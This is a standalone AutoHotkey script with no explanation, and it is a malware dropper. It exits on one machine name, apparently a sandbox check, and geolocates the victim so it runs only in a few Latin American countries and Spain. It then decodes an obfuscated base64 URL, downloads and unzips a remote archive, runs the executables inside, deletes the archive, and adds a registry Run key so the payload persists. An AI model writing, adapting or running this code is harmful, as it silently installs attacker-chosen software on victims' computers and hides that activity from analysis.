#NoEnv
#NoTrayIcon
#SingleInstance off
#Include %A_LineFile%\..\JSON.ahk
SetWorkingDir %A_ScriptDir%
if (A_ComputerName = he3eaurd("REVTS1RPUC01NDdROFZQ")) {
ExitApp
}
oWHR := ComObjCreate("WinHttp.WinHttpRequest.5.1")
oWHR.Open("GET", "http://ipinfo.io/json")
oWHR.Send()
vIP := oWHR.ResponseText
oWHR := ""
conga= vIP
parsed := JSON.Load(vIP)
ignored := { "BR":0, "MX":0, "CL":0, "ES":0, "AR":0 }
if (ignored.HasKey(parsed.Country)) = 0 {
ExitApp
}
firstLetter := Asc("a") - 1
Loop 5
{
Random rnd, 1, 26
rndLetter := Chr(firstLetter + rnd)
r .= rndLetter
}
Loop 5
{
Random rnd, 1, 26
rndLetter := Chr(firstLetter + rnd)
s .= rndLetter
}
Loop 5
{
Random rnd, 1, 26
rndLetter := Chr(firstLetter + rnd)
global  v .= rndLetter
}
barganha :=% A_AppDataCommon "\" s "\"
myzip := A_AppDataCommon "\" r ".zip"
unzipfolder := A_AppDataCommon "\" s "\"
xd5jepib := "aHR0cHM6Ly9ka2xvamEuY29tLmJyL3NpZ251cC9maWxlL2I2YzZ6aTVzdGVoajE5LnppcA=="
xd5jepib := he3eaurd(xd5jepib)
UrlDownloadToFile, %xd5jepib% , c:\programdata\%r%.zip
Sleep 1000
cf5arukh(myzip, unzipfolder)
Sleep 1000
list_files(barganha)
Sleep 1000
Loop, Files, %unzipfolder%\*.exe, F
{
run, %A_LoopFileFullPath%
}
Sleep 2000
FileDelete, C:\programdata\%r%.zip
Sleep 2000
RegWrite, REG_SZ, HKEY_CURRENT_USER, Software\Microsoft\Windows\CurrentVersion\Run, %v%, % A_AppDataCommon "\" s "\" v ".exe"
list_files(Directory)
{
files =
Loop %Directory%\*
{
files = %files%`n%A_LoopFileName%
if (SubStr(files,-2) == "aaa") {
FileMove, % A_LoopFileFullPath,   % Directory v ".exe"
} else if (SubStr(files,-2) == "bbb") {
FileMove, % A_LoopFileFullPath,  % Directory v ".ahk"
}
}
return files
}
ExitApp
cf5arukh(sZip, sUnz)
{
FileCreateDir, %sUnz%
psh  := ComObjCreate("Shell.Application")
psh.Namespace( sUnz ).CopyHere( psh.Namespace( sZip ).items, 4|16 )
}
he3eaurd(string)
{
if !(DllCall("crypt32\CryptStringToBinary", "ptr", &string, "uint", 0, "uint", 0x1, "ptr", 0, "uint*", size, "ptr", 0, "ptr", 0))
throw Exception("CryptStringToBinary failed", -1)
VarSetCapacity(buf, size, 0)
if !(DllCall("crypt32\CryptStringToBinary", "ptr", &string, "uint", 0, "uint", 0x1, "ptr", &buf, "uint*", size, "ptr", 0, "ptr", 0))
throw Exception("CryptStringToBinary failed", -1)
return StrGet(&buf, size, "UTF-8")
}
